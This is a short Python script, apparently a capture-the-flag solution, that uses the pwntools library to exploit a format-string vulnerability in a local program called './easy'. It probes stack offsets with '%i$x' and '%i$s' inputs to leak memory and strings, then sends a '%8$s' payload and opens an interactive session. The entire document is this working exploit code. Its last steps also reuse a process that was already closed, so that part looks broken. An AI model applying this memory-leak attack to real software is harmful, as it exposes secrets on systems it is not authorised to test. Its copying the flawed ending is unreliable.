from pwn import *
import re

context.log_level = 'error'

regex = re.compile(r'.*')
for i in range(1, 10):
    p = process('./easy')
    
    p.sendlineafter(b':\n', f'%{i}$x'.encode())
    line = p.recvline().decode('utf-8').strip()

    p.close()

    if (len(line) > 5):
        p = process('./easy')
        p.sendlineafter(b':\n', f'%{i}$s'.encode())
        print(f'{i}: {p.recvline()}')
        p.close()

payload = b'%8$s'
p.sendlineafter(b':\n', payload)

p.interactive()
p.close()